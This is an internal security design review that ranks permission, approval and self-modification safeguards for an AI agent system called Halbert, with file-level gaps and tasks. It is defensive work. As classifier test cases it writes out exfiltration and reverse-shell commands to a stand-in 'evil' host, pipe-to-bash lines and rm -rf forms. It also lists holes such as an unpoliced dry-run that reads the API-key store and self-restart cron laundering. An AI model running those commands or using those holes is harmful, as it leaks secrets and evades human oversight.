## permissions-consent-security — 244 verified mechanisms from HM02, HM04, HM05, HM06, HM07, HM08, HM09, HM10, HM12, HM14, HM15, HM16, HM17, HM19, HM20, OC01, OC02, OC03, OC04, OC05, OC06, OC07, OC09, OC10, OC12, OC13, OC14, OC15, OC16, OC17, OC18, OC19, OC22, OC23, OC24, OCC01, OCC02

Counts: 244 kept items (65 high / 122 medium / 57 low after verifier correction; 103 are verifier-added "-M<n>" items with effort estimated here; 5 Hermes MCP items — HM09-C3/C4/C5/C6/C17 — carry no verifier verdict and are marked so). Where the verifier corrected the reader's state or priority I follow the verifier and say so. Four anchor claims were spot-checked in the repo on 2026-09-09 and hold: `approval/simulator.py:179` is the tree's only `shell=True` and runs caller-supplied text; `dashboard/routes/terminal.py:407-423 stage_into_shell` writes the raw string to a live PTY with no gate; `mcp/client.py:239` merges the whole `os.environ` into every stdio MCP child; `dashboard/auth.py:435` reads the bearer token from `?token=`; `assert_not_governed` has zero callers outside `consent/selfmod.py`; nothing reads `ApprovalRequest.expires_at` or `ApprovalStatus.EXPIRED` after the setter at `approval/engine.py:158`.

### What Halbert has here today

Halbert's permission plane is the five-axis lattice under `persona/permission/` (`ceiling`, `affordance`, `os_grant`, `halt`, `consent`, `effective`) composing with the OpenClaw `security x ask` merge in `persona/policy.py`, typed denials with a closed reason set in `consent/denials.py`, the hash-chained consent ledger in `consent/store.py` (a grant is refused without `text_shown_sha256`), the three profiles in `persona/permission/profiles.py`, and the structurally-honest `Lease`/`LeaseRegistry` in `persona/permission/lease.py` whose `Scope` has exactly four keys and refuses any it cannot read. Ingress is the claims ladder + named-gate admission (`persona/claims.py`, `persona/admission.py`, `routes/guest.py`), the channel registry with server-stamped claims (`agents/channels.py`) and relay receipts on voice. Egress is the deterministic redaction core (`ingestion/redaction.py`, `security/result_redaction.py` — wired only at `mcp/response.py`), the variant registry (`ingestion/redaction_registry.py`, fed only by `config/queries.py:358`), the echo guard (`security/echo_guard.py`), the display seam (`security/display_transport.py`, live SSE only), the camera gate, and the Tier-2 deterministic secret template. Command execution is gated by `tools/safety.py` `ToolSafetyFramework` (unanchored raw regex, MEDIUM = run unattended), `streaming/injection_check.py`, the RoleGate, `persona/guest_tools.py` and the `execute_code` host RPC. Self-modification has a Class-1 path fence (`consent/selfmod.py`) that nothing calls, a write-only `_policy_check` in `tools/base.py:40-59`, and a legacy `approval/engine.py` that never expires a request. The dashboard door is `dashboard/auth.py` (one-door auth, single-use tickets, `guard_bind` refusing a non-loopback bind without a token) with no CSP, no body cap, no auth throttle. Already lifted from the 2026-09-07 program and not re-proposed here: policy lattice + admission gates + claims ladder, redaction variant registry + echo guard + camera gate, five-axis permission modules + consent ledger + profiles, `execute_code` with host RPC, channel registry + server-stamped claims + turn-event tee, typed denials, store hardening, run receipts.

### Lift themes, ranked

Effort key: S under a day, M a few days, L a week or more; "?" items are verifier-added and the estimate is mine.

#### Theme 1 — The command gate: normalise argv before any pattern sees it, then classify in two tiers

One packet: `tools/safety.py`, `streaming/injection_check.py`, `dashboard/routes/terminal.py`, `approval/simulator.py`, `dashboard/routes/settings.py`. All deterministic; nothing here may consult a model.

- **Two-tier hardline/dangerous shell classifier with command-position anchoring** (HM06-tools-approval-guards-C1) — origin `tools/approval_detection.py:1-420`, `tools/approval.py:531-780` (gate order at `:978-996`). A quote-aware, home-path-folding, shell-tokenised classifier with an unbypassable hardline tier (root/system rm, mkfs, dd of=/dev/sd*, fork bomb, shutdown, `sudo -S`, base64/xxd-decode piped to a shell, docker daemon redirect) under a larger dangerous tier that needs approval unless allowlisted. Halbert: partial — `tools/safety.py:115-290` is unanchored raw regex wired at `tools/executor.py:565-611`; `prompts/safety.py:47-100` is an unwired duplicate. Task: replace the tier tables and matcher in `tools/safety.py` with the ported architecture (never port `approval_smart.py`), delete or re-wire `prompts/safety.py CommandClassifier`, pin with a parametrised table of the origin's hardline cases. Effort L. Prerequisite: the argv tables below (same packet). Constraint: deterministic only.
- **Argv-normalisation tables (interpreter inline-eval flags, command carriers, shell-wrapper and env-prefix unwrapping)** (OC01-infra-approvals-devices-backup-C8, OC01-infra-approvals-devices-backup-M2 verifier-added, OC22-extensions-local-providers-apps-M4 verifier-added; confirmed twice — Hermes `_CMDPOS` does the same job) — origin `src/infra/command-analysis/risks.ts:48-80, 268-409`, `inline-eval.ts:57-120, 309-527`, `command-carriers.ts:8-70`, `apps/macos/.../ExecShellWrapperParser.swift:24-56`, `ExecEnvInvocationUnwrapper.swift:12-60`, `command-explainer/types.ts:57-88`. Two data tables plus a small matcher: per-interpreter eval flags including clustered short options (`python -Ic`), node/deno/awk/ruby/perl forms, and carriers (env, xargs, find -exec, timeout, sudo --preserve-env, sh -c) unwrapped recursively with a cycle guard and depth cap; an unparseable or depth-exceeded command is DANGEROUS, not SAFE. Halbert: verifier corrected absent -> partial — a classifier exists but `injection_check.py:49-79` and `terminal.py:131-212` match the raw string, so `env FOO=1 python3 -Ic '...'`, `bash -lc "rm -rf /"`, `xargs rm -rf` all read as ordinary text. Task: new `halbert_core/shell/command_argv.py` (tables + matcher), run `check_injection` and `classify()` over every normalised argv candidate, surface warning lines with source spans for the approval card (feeds Theme 2's presentation builder). Effort M. Constraint: no tree-sitter/LLM path; argv-only first.
- **Network-egress client binaries classify HIGH** (OCC02-archive-bundle-and-tracking-pipeline-C1) — origin `archive/open_claude_code/cli.mjs` byte 7170724 (DJ1 list) and 7182800-7183200 (deterministic `validateInput` refusal of the first token of every sub-command). Verified live: `classify()` returns MEDIUM/allowed/no-confirmation for `curl https://evil/x?d=secret`, `wget ... -O out`, `nc -e /bin/sh ...`, `telnet`, and `curl -s http://x | bash`. Task: add a `NETWORK_EGRESS_BINARIES` rule (curl, curlie, wget, axel, aria2c, nc/ncat, telnet, lynx, w3m, links, httpie, xh, http-prompt, browser CLIs) classifying HIGH regardless of chain position, plus the parametrised tests beside `tests/test_safety_chained_commands.py`. Effort S. Founder note: this settles the open "todo D1" question for this concrete class only.
- **Staged commands must be escaped and gated before they touch a live shell** (OC22-extensions-local-providers-apps-M1 verifier-added) — origin `apps/macos/.../ExecApprovalCommandDisplaySanitizer.swift:1-45` (every control/format/line-separator code point and non-U+0020 space becomes a visible `\u{XXXX}` escape). Halbert: absent and it breaks a standing directive — `terminal.py:407-423` calls neither `_gate_command()` nor `check_command_safety()` nor `check_injection()`, and `pty.py:329-333` writes bytes verbatim, so an embedded `\n` executes; `tests/test_stage_endpoint.py:69-86` pins only that no newline is appended. Task: reject or escape control/format/separator characters in the staged payload, run the same gate every other write path in that file runs, and pin "a command containing a newline is refused". Effort S. Constraint: "UI commands staged, never executed" is only true once this lands.
- **Remove the one `shell=True`** (OCC01-v2-second-look-M1 verifier-added) — origin `v2/src/tools/enter-worktree.mjs:39-56` and siblings (discrete argv everywhere, rationale in-line). Halbert: `approval/simulator.py:176-182` runs `f"{command} {dry_run_flag}"` with `shell=True`, reachable from `POST /api/settings/simulate/command` (`routes/settings.py:2795-2812`) with no path through SafetyChecker, RoleGate or ToolExecutor; the five-keyword list at `:169-172` only appends a warning. Task: route the simulate endpoint through ToolExecutor's gate or delete it; if kept, `shlex.split` into argv, refuse `dry_run_flag` that is not a single `-`/`--` option token. Effort S. This is the command-execution sibling of audit finding F67.
- **Creation-time hard reject of self-restart/kill job shapes, indirection-aware** (HM16-cron-second-pass-C9; sibling HM07-tools-terminal-files-checkpoints-C9) — origin `cron/lifecycle_guard.py:1-8, 21-63` (launchctl submit/bootstrap/bootout/remove/disable included because they launder a blocked restart into a new keepalive job, #62891/#80260; backslash-newline collapse), `tools/terminal_tool_guards.py:175-241` (gated on being a supervised process; bounded read of any referenced script). Halbert: `tools/schedule_cron.py:16-50` writes free-text `{schedule} {command}` into the OS crontab gated only by the per-tool-name `_policy_check`; `tools/safety.py:190-198` has generic systemctl/service HIGH rules, no launchctl rule at all, and no notion that the job label is Halbert's own. Task: a `lifecycle_guard.py` hard reject in `schedule_cron` and in the classifier for launchctl/systemctl/pkill shapes naming Halbert's dashboard unit or launchd label, with the "run it from outside" message. Effort M (C9 rider S). HM07-C9 verifier-corrected absent -> partial and kept low: the UI-staged directive blunts the worst path.
- **Heredoc-body masking for regex guards** (HM07-tools-terminal-files-checkpoints-C21) — origin `tools/shell_heredoc.py:1-8`, `terminal_tool_guards.py:76-89`. Mask a heredoc body only when every delimiter is quoted and terminated and the consumer is an inert interpreter. Halbert: verifier lowered medium -> low — `safety.py:642-720` does raw matching over the whole literal, so a keyword inside a heredoc over-classifies (fails safe); this is a false-positive fix, worth doing only after the argv tables land. Effort S.
- **Model-produced tool arguments validated against the declared schema before dispatch; shape-only error hints** (OC13-packages-M3 verifier-added, OC14-agents-second-pass-A-M6 verifier-added) — origin `packages/llm-core/src/validation.ts:342-403` (unknown tool is a hard error; coercion may never invent a null; per-path errors plus the received args), `src/agents/agent-tools.params.ts:21-49, 116-140, 200-263` (error text names a shape token, never the value; tabled repairs for path params only). Halbert: absent — `model/client.py:440-469` only json-loads; `executor.py:431-438` dispatches `handler(args)`; verified that `classify('run_command', {'command': ['rm','-rf','/']})` raises `AttributeError` from `executor.py:569`, outside the try at `:624`, so a weak local model gets a crash rather than a correctable refusal. Task: one validator at the executor dispatch seam (required/type check from the schema, shape-token errors with a fixed retry suffix, a small reviewable repair table for path params), and move the classify call inside the guarded region. Effort M. This matters more for Halbert than the origin because local models mangle arguments routinely.

#### Theme 2 — Approvals bound to exactly what was shown, fail closed, and presented through one builder

One packet over `approval/engine.py`, `agents/state_machine.py` (hot), `dashboard/routes/approvals.py`, `dashboard/routes/agent.py` (hot: `apply_diff`), `components/agent/ConfirmationDialog.tsx`, `pages/Approvals.tsx`. Strengthens the already-lifted "durable one-shot consents" and "byte-exact approval bindings" that packet 02 recorded but never built.

- **Approvals expire and fail closed; 'auto' mode goes** (OC14-agents-second-pass-A-M2 verifier-added) — origin `src/agents/agent-tools.before-tool-call.approval.ts:59-72, 86-101, 172-198` (finite capped timeout forced on every request; a plugin's `timeoutBehavior:'allow'` is warned and ignored; a run with no approval-capable surface is refused up front with a named reason). Halbert: `engine.py:134-158` sets `expires_at` only when the caller passes `timeout_seconds` (default None); `EXPIRED` and `expires_at` have no readers (spot-checked); `get_pending_requests` (`:317-332`) filters on status only; `mode='auto'` (`:164-173`) grants by argument with a log warning; three live surfaces use the engine (`mcp/server.py:481,541`, `routes/approvals.py:67-101,136`, `routes/findings.py:57-65`). Task: mandatory bounded default timeout, every read path marks elapsed requests EXPIRED == denied, delete or test-gate `auto`, refuse up front when the run has no answering surface (scheduler runs). Effort S. Founder decision F-A1 below.
- **One-shot, canonical-hash-bound approval with consume-before-apply** (OC09-tasks-system-agent-flows-boards-claws-C7) — origin `src/system-agent/operator-approval.ts:8-72` (sha256 over stable-stringified operation; closed-list APPROVE/DECLINE regex; `clear()` before `apply()` so duplicate callbacks cannot replay). Halbert: verifier corrected absent -> partial — `approval/engine.py:23-83, 134-158, 304-351` has request/decision/status but no hash binding a decision to one unchanged action and no consume-before-apply. Task: `hash_operation()`, `resolve_pending_proposal()`, `resolve_approval_decision()` in `approval/engine.py`, decision refused on hash mismatch, authority cleared before apply. Effort M. Constraint: do not port `approval-intent.ts`'s model fallback — leave ambiguous replies unmatched.
- **Re-bind the confirmation to the tool call it approved at resume, and re-verify script operands before exec** (OC16-gateway-second-pass-A-M1 verifier-added, OC17-gateway-second-pass-B-C11, OC17-gateway-second-pass-B-M3 verifier-added, OC22-extensions-local-providers-apps-M5 verifier-added) — origin `src/gateway/cron-creator-authority-grant.ts:143-213`, `src/gateway/node-invoke-system-run-approval-match.ts:29-56`, `src/infra/system-run-approval-binding.ts:97-121` (envHash covers keys AND values — the verifier corrected the reader's "key names only"), `:624-677` (operand sha256 + resolved real path re-checked after the human answers), `apps/macos/.../ExecAllowlistMatcher.swift:6-53` (allow-always accepted only with a `sha256:cwd-argv:v1:` digest; path-only entries refused rather than migrated). Halbert: the pause is bound on the way in (`state_machine.py:3468-3475`, mismatch refused at `:1514`, one-shot cleared at `:3583`) but `_handle_executing` re-reads `ctx.tool_calls[-1]` (`:3422`) and computes `confirmed` (`:3449-3452`) without comparing `pending_confirmation['action_id']`/`['tool']` to what is about to run; steering can append a call between request and resume (`:877-890` already reconciles a staged call against the pending id). `Scope` (`lease.py:116-159`) has no command axis, so a remembered approval cannot be bound to argv+cwd. Task: (a) at resume, refuse unless the executing call's exec_id and tool equal the pending record; (b) fingerprint run_command/execute_code/run_applescript approvals over normalised argv + cwd + env (values) and re-check before the PTY starts; (c) snapshot sha256 + realpath of any script operand at approval and re-verify immediately before exec; (d) design guardrail: a future "don't ask again" scope key is a digest over (argv, cwd), never a name or glob. Effort M (a is S). Prerequisite: Theme 1 argv normalisation so the fingerprint uses the same parse the gate saw.
- **Approval bound to the reviewed file state; base-hash guard on policy writes** (OC13-packages-M1 verifier-added) — origin `packages/gateway-protocol/src/schema/exec-approvals.ts:184-220, 246-272` (policySnapshot + mutableFileOperand {argvIndex, path, sha256}; baseHash mandatory on native policy writes). Halbert: `routes/agent.py:2172-2203` applies a stored diff by writing `new_content` wholesale; the current text is read only for provenance digests (`:2209-2219`), never compared to what the owner reviewed; this repo runs concurrent sessions. Task: stamp `base_sha256` when a diff proposal is created (`state_machine.py:4056-4060 pending_diffs`), refuse apply with a typed "the file changed since you reviewed this" and offer re-review; apply the same base-hash rule to writes of the consent/permission config. Effort S. Touches routes/agent.py (hot).
- **Run-scoped delegated authority, generation-stamped; sub-lease closure never revokes whole-run resources** (OC01-infra-approvals-devices-backup-C1) — origin `src/infra/agent-run-registry.ts:376-527`, `agent-run-approval-leases.ts:24-58`, `agent-run-authority.types.ts:1-6`. Halbert: verifier corrected absent -> partial — `persona/permission/lease.py` already mints only via `require()`, carries `_turn_id`, trips stop events on revoke; missing a lifecycle-generation stamp (a lease must not survive a loop/process rotation that recycled the turn id) and the narrower sub-lease algebra. Task: add `lifecycle_generation` to `Lease`, bump on scheduler/process restart, re-validate before honouring a decision. Effort M (demoted high -> medium by the verifier).
- **One approval-presentation builder, every field sanitised there; invisible-character defence; refuse-to-compact paths; fences sized to content** (OC01-infra-approvals-devices-backup-M1 verifier-added, OC01-infra-approvals-devices-backup-C3, OC01-infra-approvals-devices-backup-M5 verifier-added, HM17-plugins-acp-providers-M3 verifier-added; confirmed twice — OpenClaw sanitiser and Hermes fence) — origin `src/infra/approval-presentation.ts:41-131`, `exec-approval-text-sanitize.ts:15-26, 73-173` (256 KB hard input cap, 16 KB output cap applied after redaction, Cf/Cc/Cs/Zl/Zp escaped), `approval-scope.ts:36-73`, `approval-display-paths.ts:1-36` (a path with a `.`/`..` segment is never compacted; display and matching strings are distinct fields), `acp_adapter/tools.py:165-170` (`max(3, longest_backtick_run+1)`). Halbert: `routes/approvals.py:72-85, 200-212` emit model-authored `action`/`reasoning`/`affected_resources` as a raw dict — no redaction, cap, invisible-character handling or closed vocabulary; the primitive exists on another boundary (`integrations/observation_text.py:62-131` scrub -> redact -> cap, pinned); `tools/safety.py:762, 782, 798, 808` build the confirmation Markdown with hard-coded triple-backtick fences that `MarkdownRenderer.tsx:93` and `ConfirmationDialog.tsx:54` parse with non-greedy regexes, so content containing ``` picks its own rendering on the approval surface. Task: `approval/presentation.py` as the only producer of anything a surface renders (scrub, then `redact_text`, then per-field cap; refuse on out-of-vocabulary `risk_level`); route `routes/approvals.py`, the websocket push and the confirmation event through it; a fence helper at the four `safety.py` sites; the compaction rule. Effort M. Verifier design note: do not port the dual-view bitmap — Halbert's strip-then-redact order already is the stripped view.
- **Approval UI: countdown/expiry, command-span highlighting, stale-resolution classing, exhaustive scope taxonomy, keyboard chords, refresh reconciliation** (OC23-control-ui-C2, OC23-control-ui-C1, OC23-control-ui-C4, OC23-control-ui-C6, OC23-control-ui-C3, OC23-control-ui-C5) — origin `ui/src/components/exec-approval-card.ts:47-89, 100-139, 154-178, 242-248, 267-364`, `ui/src/app/exec-approval.ts:65-90, 345-376, 402-554`. Halbert: C2 verifier-corrected absent -> partial (`expires_at` exists, never serialised at `routes/approvals.py:73-84`); C1's real surface is `ConfirmationDialog.tsx:88-95`, which escapes HTML before the markdown pass on purpose — spans must be applied pre-escape; C4 is frontend-only (`routes/approvals.py:239/242` already emit 404/400); C6 degenerates to {shell exec, config write, standing scheduled grant, network egress}; C3's two safety rules (refuse chords from text-entry ancestors; every authorising chord needs Ctrl/Cmd because the modal steals focus) are mandatory if shortcuts land; C5 demoted medium -> low (no push path exists — `approval_decision` broadcast at `routes/approvals.py:266-273` has no frontend consumer). Effort S each, C5 M. Ship after the presentation builder.
- **Human-approval wait time is not charged to the run's clock** (OC14-agents-second-pass-A-C21) — origin `src/agents/agent-run-approval-wait.ts:10-60` plus consumers that suspend the deadline (`attempt-timeout-prepare.ts:116-131`). Halbert: absent; the only deadline a pending approval could burn today is `state_machine.py:2022-2042 await_subagent_completion(timeout=300)`. Effort S, low.
- **Permission-option ladder collapses when 'remember' would not be honoured** (HM17-plugins-acp-providers-C6) — origin `acp_adapter/permissions.py:33-53`. Halbert: `agents/events.py:263-281 tool_confirmation_required` carries no option set at all, so nothing can lie yet; `lease.py` is where "does this grant persist" is answered. Rule for when the dialog grows options. Effort S, low.
- **A standing grant pinned to the target's fingerprint, not only to policy version and expiry** (OC19-extensions-identity-security-ops-C8) — origin `extensions/onepassword/src/broker.ts:24-104` (`StandingGrant` carries `expiresAtMs` AND `targetFingerprint`; `POLICY_CHANGED` and `GRANT_EXPIRED` are distinct error codes; every attempt is audited with a typed outcome and a mandatory reason string). Halbert: `consent/store.py:151-224 ConsentRecord` has `policy_version`, `expires_at`, `scope`, `cause`, `prior` and `text_shown_sha256` — a fingerprint of what the human was shown, the closest analogue — but no fingerprint of the target's own shape, so a grant survives the resource it was granted for changing under it. Task: an optional `target_fingerprint` on the record (the existing scope dict can carry it with no schema change), checked in `require()` alongside `policy_version`. Effort S, low; the deterministic-policy discipline is already in place, this is additive.
- **A review that cannot be shown in full cannot be approved** (OC06-plugins-sdk-M5 verifier-added) — origin `src/plugins/install-security-scan.runtime.ts:34-46, 99-176` (an approvable notice over 4,000 chars is converted to a refusal; a block, which needs no consent, may truncate). Halbert: `consent/copy.py:366-416` + `store.py:411-418` prove the digest is of the intended wording but nothing proves the surface rendered it whole. Task: a max length in the copy manifest matched to the review surface plus a render-side assertion; a review that cannot be displayed whole records no grant. Effort S, low.
- **Confirmation carries no speaker claim** (OC16-gateway-second-pass-A-M5 verifier-added) — origin `src/gateway/approval-channel-custody.ts:18-61`. Halbert: `ConfirmActionRequest` is `{action_id, confirmed}`; `confirm_action` takes no speaker role; sound today because the route sits behind `require_owner`. Record as a known boundary: an approval must be answered from a surface with a claim at least as strong as the requester's; revisit when the guest persona gains a dashboard-posting surface. No change now.
- **Deterministic minimal-prefix + injection detection before persisting a standing allow-rule** (OCC02-archive-bundle-and-tracking-pipeline-C2) — origin `cli.mjs` 7145200-7148700 (policy_spec) and, the half the reader missed, `Uo5()` at 7148231 / `pW2()` at 7148606 / consumer at 7520860 — a real shell parser refuses any operator outside {glob, &&, ||, ;, ;;} and the "don't ask again for <prefix>" option is offered only when that deterministic check passes. Halbert: absent (no `always_allow`/`command_prefix` anywhere). Task: a shlex/token-walk prefix extractor and injection check in the consent module, blocking a standing grant on `&&`, `||`, `;`, backticks, `$(...)`, literal newline or redirects, storing prefix + verdict in the consent record. Effort M (verifier demoted high -> medium; no standing-allow UI exists yet). Constraint: the origin's LLM prefix call must not be ported.
- **Preview-bound destructive execution** (HM14-cli-ops-lifecycle-M5 verifier-added) — origin `hermes_cli/checkpoints.py:74-99` (the confirmed set is passed as an explicit allowlist; an empty preview binds an empty allowlist). Task: audit, not port — `findings/proposals.py` (approved_at :32/52, execution_result :148) and `consent/store.py` scope (:153/175/209): does execution act on the recorded target set or re-derive it? Any divergence is "approved one thing, got another". Effort S.

#### Theme 3 — Self-modification: the write-approval gate, the config-key fence, and honest config writes

One packet over `tools/write_config.py`, `tools/base.py`, `consent/selfmod.py`, `config/being_config.py`, `model/llm_config.py`, `dashboard/routes/editor.py`, `routes/agent.py` `_write_file` (hot), `tools/executor.py` `_write_file` (hot). The `assert_not_governed` wiring is the REVIEW-GATED D3-P5 item — propose the review, not a silent merge.

- **The write-approval gate module: durable pending store, three-state decision, stage-never-silently-refuse, bypass-token replay** (HM10-tools-skills-second-pass-M1 verifier-added, HM10-tools-skills-second-pass-C15) — origin `tools/write_approval.py:1-10, 71-90, 128-186` (pending record written tmp+`os.replace`; on disk failure the write is lost — "the safe failure for an approval gate"; `GateDecision` has exactly one of allow/blocked/stage set; an unavailable approval channel STAGES rather than denies), `tools/skill_manager_tool.py:576-596, 624-631` (the replay re-enters the same code with a ContextVar bypass token). Halbert: partial — `tools/base.py:14-18, 43-45` has `dry_run`/`confirm`, `terminal.py:423` returns an ad-hoc `{'ok': True, 'staged': ...}`; no durable pending store, no replayable payload, no count for the indicator. Task: one `halbert_core/approval/pending_store.py` behind the "staged, never executed" directive — record (id, subsystem, action, gist, origin, created_at, replay payload), three-state decision, replay through the same path, a dashboard count; first consumers `terminal.py:423` and the SK-6 skill write path. Fail CLOSED where Hermes fails open (`skill_manager_tool.py:584-586` permits the write on import error). Effort M.
- **Close the Class-1 fence loop and add the key-level denylist that a path fence cannot express** (OC09-tasks-system-agent-flows-boards-claws-M1 verifier-added, OC09-tasks-system-agent-flows-boards-claws-C6, HM12-gateway-rooms-platforms-hooks-C9) — origin `src/system-agent/config-write-policy.ts:1-69` (a static denylist of config roots the agent may never write regardless of approval — `$include`, auth, env, models, secrets — each carrying its human escalation sentence; path classification allowed|blocked|agent-route|plugin-entry), `operation-types.ts:7-82` (closed operation union, no exec member; `isPersistentSystemAgentOperation` exact mutating allowlist), `gateway/platforms/webhook.py:313-324` (toolsets override not settable from the agent API). Halbert: verifier corrected absent -> partial and made this the strongest row — `consent/selfmod.py:1-38, 72-143` defines the Class-1 never-writable set and `assert_not_governed` (`:174-196`), whose docstring claims `write_config`, `_write_file`, `routes/editor.py`, the recovery rollback, the privileged helper and the PTY ledger watcher all call it; grep shows zero callers (spot-checked). `tools/write_config.py:60-70` still takes an arbitrary path with only a per-tool-name `_policy_check`. Task: (a) wire `assert_not_governed` at the six named sites on the resolved path the handler will open, plus a test that fails when any write primitive gains a path argument without the call (this is D3-P5 — schedule the review); (b) a config-KEY denylist for Halbert's own settings (secret refs, model-slot connection settings, MCP server definitions, autonomy dial) checked in `write_config.py` before any diff is computed, with a parity test walking the schema so a new key is denied until classified; (c) a closed `SystemOperation` union with `is_persistent_operation()`/`describe_operation()` so the self-management surface is enumerable; (d) audit `tools/{config_editor,write_config,schedule_cron}.py` for any agent-writable field a later gate trusts as a grant. Effort M. Founder decision F-A2.
- **Dry runs are policed too: write_config's preview is an unpoliced read, and its diff reaches the model unredacted** (OC05-config-M3 verifier-added, OC05-config-M2 verifier-added) — origin `src/config/io.observe-recovery.ts:190-213` (reads are audited events), `io.write.ts:388-407` (a refused write is audited at refusal), `commands-config.ts:103-123` + `redact-snapshot.ts:284` + `io.audit.ts:90-127` (config values never appear in derived text; redaction is at the rendering seam). Halbert: `tools/base.py:40-59 _policy_check` returns `(True, None)` whenever `is_apply` is false, so a `dry_run` `write_config` never reaches `decide()` and then returns a unified diff of the real file (`write_config.py:190-206, 220-230, 256-266`, rollback `:87-94`) — a general file-read primitive with no path policy, and `agents/react_agent.py:318-322` hands that diff to the model. `write_config(path='~/.config/halbert/models.yml')` returns hunks of the API-key store. Task: apply the path policy to the read half (move the gate above the dry-run branch, or an explicit read-scope `decide(..., is_apply=False)` whose denial suppresses the diff); run the diff through `ingestion/redaction.redact_text` before it becomes a tool result. Effort S. This is the concrete instance of the parked 05-C question ("do internal tool results route through the redaction core").
- **Atomic, permission-hardened, rotating, self-verifying config writes** (OC05-config-C1, OC05-config-C2, OC05-config-C10, OC09-tasks-system-agent-flows-boards-claws-C8, OC01-infra-approvals-devices-backup-M3 verifier-added) — origin `src/config/io.write.ts:425-450` (replaceFileAtomic — the reader's 246-262 was wrong; `src/infra/replace-file.ts:1-8` is a re-export of `@openclaw/fs-safe/atomic`), `backup-rotation.ts:22-59` (5-slot ring, every slot chmod 0600, one `.pre-update` snapshot outside the ring), `io.write-safety.ts:46-67` (best-effort chmod 0700 of the config dir on every write), `post-write-verification.ts:11-47` (re-read + revalidate once; degrade to a manual notice), `directory-durability.ts:30-47, 95-123` + `backup-create-stream.ts:131-157` (exclusive create, fd identity re-checked, directory fsync). Halbert: `write_config.py:204-206, 228-230, 264-266` do `copy2` then `open(path,'w')` (rollback `:93-94` non-atomic too), single `.bak` overwritten each write, no post-write re-parse; `llm_config.py:773` backs up only when `needs_migration`; `utils/platform.py:308-335 get_config_dir` never chmods and routes a root-run config to `/etc/halbert` at umask default while `findings/detectors/permissions_hygiene.py:56-90` flags other people's `~/.ssh` at anything but 0700; nine other writers already use mkstemp+`os.replace` and disagree on the last step — `run_receipts.py:103-133` and `monitor_hash.py:145-157` fsync the directory, `scheduler/engine.py:50-58`, `scheduler/executor.py:305-320` (the restart ledger) and `mcp/config.py:788-800` stop one syscall early. Task: one `utils/atomic_write.py` (mkstemp in dir, fsync file, `os.replace`, fsync dir, chmod 0600, temp identity recorded so the error-path unlink cannot remove a file it did not create), used at all writers; `.bak` ring + 0600; chmod 0700 of the config dir on save; deterministic `verify_after_write()` returning one notice naming the `.bak` (never a second write, never a model-proposed repair). Effort S+S+S+S+M. C10 promoted low -> medium by the verifier on the hygiene asymmetry.
- **Pre-commit suspicious-write heuristic with rejected-payload preservation** (OC05-config-C3) — origin `io.write-safety.ts:141-184` (size drop >= 50% with a 512-byte floor, baseline canonicalised so a formatting-only rewrite is not a drop; missing metadata; structural marker loss), `io.write.ts:388-407` (payload saved to `<path>.rejected.<ts>` with `wx`, audited, then thrown). Halbert: absent — `continuity/write_guard.py:107-150` only detects external drift. Task: the heuristic in `write_config.py`'s apply path, explicit override flag, rejected payload preserved. Effort M. Related: OC05-config-C4 (read-time last-known-good + auto-restore) is in the do-not-lift list; keep its fingerprint idea as a note here.
- **Optimistic snapshot-race guard for models.yml** (OC05-config-M1 verifier-added) — origin `io.write-safety.ts:13-44` (assertBaseSnapshotStillCurrent), `io.write.ts:441-450` (re-run inside the rename). Halbert: `being_config.py:506-580` holds an advisory flock for the whole load-modify-save; `llm_config.py:765-778 save()` and `:816-835 update()` are unlocked read-modify-write over the API-key store, and the dashboard drawer (`routes/llm.py`) is an HTTP read-modify-write. Task: give `llm_config.py` the `being_config_lock` treatment keyed on models.yml, plus a base-snapshot hash on the dashboard PUT. Effort S.
- **Strict unknown-key rejection with a dead-keys test** (OC05-config-C8) — origin `src/config/dead-config-keys.test.ts:1-60`. Halbert: `being_config.py:406-434 from_dict` silently drops unknown keys; failure directions are asymmetric — a typo in `extra_secret_keys` (`:73`, consumed by `config/sensitivity.py:93-121` and `security/result_redaction.py:157`) silently drops an operator's instruction to treat a key as secret (fails OPEN); `validate()` never runs on an unset field. Task: reject (or at least log and refuse for the secret-affecting fields) unknown keys in `BeingConfig.from_dict`, `SecurityConfig.from_dict`, the llm loader; a pytest pinning removed keys. Effort S. Constraint: this IS the no-legacy-support directive as a tested boundary.
- **Config load must not be a silent write** (OC05-config-M6 verifier-added) — origin `io.clobber-snapshot.ts:7-47` (a capped ring of clobber snapshots before any automatic overwrite). Halbert: `being_config.py:663-696 _apply_runtime_relocks` + `_persist_relock` rewrite being.yml on every process start with no copy of what was there (the atomic replace at `:863-870` leaves no `.bak`). Task: before `_persist_relock` saves, copy into a 2-3 slot ring (reuse the C2 helper) and record the relock via `continuity.provenance.record_file_change` with an explicit actor. Effort S.
- **Per-leaf HMAC fingerprint baseline for field-level change attribution** (OC05-config-M4 verifier-added) — origin `config-journal-snapshot.ts:32-112`. Halbert: `continuity/provenance.py:131-191` records whole-file digests only, so the steward can say "being.yml changed" but never which fields. Task: optional per-leaf fingerprints for being.yml/models.yml keyed by a 0600 machine-local key, stored beside the existing digest in the continuity ledger, rendered as "which fields changed"; degrade to the plain marker when the key store is unavailable. Effort M, medium.
- **Redaction-sentinel pollution must never overwrite a real secret** (OC05-config-C5) — origin `io.observe-recovery.ts:258-292` (note: enforced as a recovery-integrity gate at `:510-516, 597-603`, not a write rejection — the write-path check is an extension). Halbert: verifier corrected absent -> partial — `integrations/frigate/frigate_config.py:143-147 _is_masked_credential` exists and `routes/llm.py:148-169` never sends the key at all (`api_key:''` + `key_set`, carry-forward at `llm_config.py:790-813`). Task: reuse `_is_masked_credential` as a shared guard at every Tier-2 field save (`config/sensitivity.classify_sensitivity` picks the fields). Effort S, medium.
- **Write origin as ambient context** (HM10-tools-skills-second-pass-M7 verifier-added) — origin `tools/skill_provenance.py:1-26`. Halbert: has `current_speaker_role`, `current_turn_claim`, `current_turn_channel` ContextVars and an `ACTOR_AGENT` constant, but nothing distinguishes an operator-directed write from one the scheduler or cognitive loop initiated. Task: one write-origin ContextVar bound where autonomous work starts (`scheduler/engine.py`, `home/cognitive_loop.py`), read in the audit trail and any self-editing guard. Effort S; prerequisite for letting Halbert edit its own skills/config.
- **Automation identity declared by the runner, never inferred** (OC01-infra-approvals-devices-backup-M4 verifier-added) — origin `src/infra/cron-run-exec-source.ts:1-48` (jobName is display only; jobConfigRevision is part of identity so a standing grant stops matching when the job changes). Halbert: `persona/permission/consent.py:75-83 Principal` has the vocabulary ("names never authorize anything"); nothing under `scheduler/` stamps one. Task: `scheduler/executor.py` stamps `Principal(kind='automation', id=f'job:{job_id}@{config_revision}', authn='none')`; `require()` treats it as a distinct subject so an interactive owner grant is not silently reusable by a cron job. Effort S. This is the identity half of the prior review's "standing grants for scheduled work".
